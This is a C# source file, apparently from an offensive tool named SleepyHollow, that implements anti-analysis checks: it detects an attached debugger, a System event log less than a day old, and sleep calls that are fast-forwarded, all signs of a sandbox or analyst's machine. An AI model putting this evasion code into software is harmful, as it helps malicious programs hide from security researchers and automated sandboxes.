using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SleepyHollow;

internal static class EvasionCheck
{
    internal static bool Detected => IsDebuggerPresent() || IsFirstEventLogLessThanDayOld() || IsTimeFastForwarded();

    internal static bool IsTimeFastForwarded()
    {
        var startTime = DateTime.Now;
        Task.Delay(2000).Wait();

        double elapsed = (DateTime.Now - startTime).TotalSeconds;
        if (elapsed < 1.5)
        {
            Console.WriteLine("- Time is fast forwarded");
            return true;
        }
        Console.WriteLine("- Time is NOT fast forwarded");
        return false;
    }

    internal static bool IsFirstEventLogLessThanDayOld()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            EventLog log = new("System");

            if (log.Entries.Count > 0)
            {
                var firstEvent = log.Entries[0];
                var age = DateTime.Now - firstEvent.TimeGenerated;

                var freshEventLog = age.TotalDays < 1;
                Console.WriteLine($"- Event log is LESS than a day old: {freshEventLog.ToString().ToUpper()}");
                return freshEventLog;
            }
        }
        Console.WriteLine("- Event log check skipped");
        return false;
    }

    internal static bool IsDebuggerPresent()
    {
        var isDebuggerPresent = false;
        Lib.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        Console.WriteLine($"- Debugger present: {isDebuggerPresent.ToString().ToUpper()}");
        return isDebuggerPresent;
    }
}